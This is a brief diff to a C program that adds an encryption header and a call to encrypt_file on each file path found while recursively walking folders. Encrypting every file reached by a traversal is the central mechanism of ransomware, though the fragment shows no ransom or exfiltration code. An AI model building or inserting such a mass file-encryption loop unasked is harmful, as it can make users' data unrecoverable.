@@ -1,4 +1,5 @@
 #include "file.h"
+#include "encrypt.h"
 
 /*
 Sources:
@@ -71,8 +72,8 @@ int loop_through_files(folder_t *first) {
                     // printf("FILE: %s\n", new_path);
                     /* 
                     Call the encryption function
-                    
                     */
+					encrypt_file(new_path);
                 }
             }
         }
